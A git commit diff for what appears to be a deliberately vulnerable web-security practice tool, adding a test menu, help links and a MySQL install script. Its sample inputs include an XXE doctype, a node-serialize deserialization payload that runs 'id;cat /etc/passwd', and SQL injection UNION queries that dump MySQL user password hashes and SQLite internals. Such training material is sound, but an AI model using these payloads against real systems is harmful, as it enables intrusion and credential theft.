851854f6d4a1ce48e453cb2e730b634e6f913161
Eric P <eric.paquet@nuance.com>
2020-11-23 14:52:51 -0500

    Hack menu

--- client/js/hacks.js
+++ client/js/hacks.js
@@ -2,18 +2,63 @@ function addSample(sampleName) {
     $("#InputArea").val(samples[sampleName]);
 }
 
-function showRef(sampleName) {
-    window.open(refs[sampleName], "HackToolRefWin");
+function showRef(testname, reftype) {
+    window.open(refs[testname][reftype], `HackRefWin-${reftype}`);
 }
 
 function runProcessor(processor) {
+    let indent = 0;
+    if ($("#PrettifyOutput").prop("checked")) indent = 4;
+
     $("#OutputArea").val("");
     let inputData = $("#InputArea").val();
     restRunHackTool(processors[processor], inputData, function (data) {
-        if (data !== null && data !== undefined)
-            $("#OutputArea").val(JSON.stringify(data, null, 2));
-        else $("#OutputArea").val(JSON.stringify("ERROR, review logs"));
+        if (data !== null && data !== undefined) {
+            $("#OutputArea").val(JSON.stringify(data, null, indent));
+        } else $("#OutputArea").val(JSON.stringify("ERROR, review logs"));
     });
+}
+
+function switchTest() {
+    let testname = $("#HackToolSel").val();
+    console.info(`Switching test to ${testname}`);
+    addSample(testname);
+    $("#RunHack").prop("hidden", false);
+    $("#HackHelp").prop("hidden", false);
+    $("#DevHelp").prop("hidden", false);
+    $("#GenHelp").prop("hidden", false);
+}
+
+function runTest() {
+    let testname = $("#HackToolSel").val();
+    if (testname !== null) {
+        console.info(`Running test ${testname}`);
+        runProcessor(testname);
+    }
+}
+
+function showHackHelp() {
+    let testname = $("#HackToolSel").val();
+    if (testname !== null) {
+        console.info(`Showing hacking help for test ${testname}`);
+        showRef(testname, "hack");
+    }
+}
+
+function showDevHelp() {
+    let testname = $("#HackToolSel").val();
+    if (testname !== null) {
+        console.info(`Showing dev help for test ${testname}`);
+        showRef(testname, "dev");
+    }
+}
+
+function showGenHelp() {
+    let testname = $("#HackToolSel").val();
+    if (testname !== null) {
+        console.info(`Showing generic help for test ${testname}`);
+        showRef(testname, "gen");
+    }
 }
 
 let samples = {};
@@ -24,8 +69,8 @@ samples.xml = `<!DOCTYPE foo [<!ELEMENT foo ANY >
     <product> <name>PS4</name> <description>Gaming Console</description> </product>
     </products>`;
 samples.json = `{"msg":"See server log for RCE :-)","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}`;
-samples.mysql = `#SELECT table_schema,table_name,table_type FROM information_schema.tables;\nSELECT host,user,password from mysql.user;`;
-samples.sqlite = `select type,name,tbl_name from sqlite_master;\npragma index_list;\npragma module_list;\npragma function_list;\npragma database_list;\nselect count(*) from artists;`;
+samples.mysql = `SELECT table_schema,table_name,table_type FROM information_schema.tables UNION SELECT host,user,password from mysql.user;`;
+samples.sqlite = `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1\nUNION select "SQLITE_VERSION", sqlite_version(),"",""\nUNION select "SQLITE_DATE", datetime('now','localtime'),"",""\nUNION select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table" ;\n\npragma module_list;\npragma database_list;\npragma function_list;\n`;
 
 let processors = {};
 processors.xml = "xmlparser";
@@ -33,9 +78,37 @@ processors.json = "jsonparser";
 processors.mysql = "mysql";
 processors.sqlite = "sqlite";
 
-let refs = {};
-refs.xml = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing";
-refs.json =
-    "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/";
-refs.mysql = "https://portswigger.net/web-security/sql-injection/cheat-sheet";
-refs.sqlite = "https://www.sqlitetutorial.net/sqlite-select/";
+let refs = {
+    xml: {
+        hack: "https://portswigger.net/web-security/xxe",
+        dev: "https://www.npmjs.com/package/libxmljs",
+        gen: "https://xmlwriter.net/xml_guide/entity_declaration.shtml",
+        //owasp: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+        //intro2: "https://www.w3schools.com/xml/xml_dtd_intro.asp",
+    },
+    json: {
+        hack:
+            "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
+        dev: "https://www.npmjs.com/package/node-serialize",
+        gen:
+            "https://github.com/appsecco/dvna/blob/master/docs/solution/a8-insecure-deserialization.md",
+        //owasp: "",
+    },
+    mathjs: {
+        hack:
+            "https://github.com/appsecco/dvna/blob/master/docs/solution/a9-using-components-with-known-vulnerability.md",
+        dev: "https://mathjs.org/docs/expressions/parsing.html",
+        gen: "https://mathjs.org/docs/expressions/parsing.html",
+    },
+    mysql: {
+        hack: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        dev: "https://www.npmjs.com/package/mysql",
+        gen: "https://mariadb.com/kb/en/select/",
+    },
+    sqlite: {
+        hack:
+            "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md",
+        dev: "https://www.npmjs.com/package/sqlite3",
+        gen: "https://www.sqlitetutorial.net",
+    },
+};
--- utils/install_mysql_server.sh
+++ utils/install_mysql_server.sh
@@ -1,18 +1,25 @@
 #!/bin/bash
-set -x
-SVC_NAME="app"
-CMD[0]="apt-get install mysql-server"
-CMD[1]="service mysql start"
-CMD[2]="service mysql status"
-CMD[3]="mysql < /app/utils/create_mysql_tester.sql"
+CTR_NAME="waptr"
+CMD[1]="apt-get update"
+CMD[2]="apt-get install mysql-server"
+CMD[3]="service mysql start"
+CMD[4]="service mysql status"
+CMD[5]="mysql < /app/utils/create_mysql_tester.sql"
+CMD[5]="mysql"
+CMD[5]="/bin/bash"
+OPT[1]=""
+OPT[2]=""
+OPT[3]=""
+OPT[4]=""
+OPT[5]="-it"
 
 read -p "This will install and configure mysql server in the app container. Proceed? [n] " answer
 if [ "$answer" = y ];then
-  for i in $(seq 0 3);do
+  for i in $(seq 1 5);do
     echo -e "\n"
-    read -p "-- Execute this in container ${CONTAINER_NAME}: ${CMD[$i]} ? [n] " answer
-    if [ "$answer" = y ];then
-      docker-compose exec "$SVC_NAME" ${CMD[$i]}
+    read -p "-- Execute this in container ${CTR_NAME}: ${CMD[$i]} ? [y] " answer
+    if [ "$answer" = y -o "$answer" = "" ];then
+      docker exec ${OPT[$i]} "$CTR_NAME" ${CMD[$i]}
     fi
   done
 fi
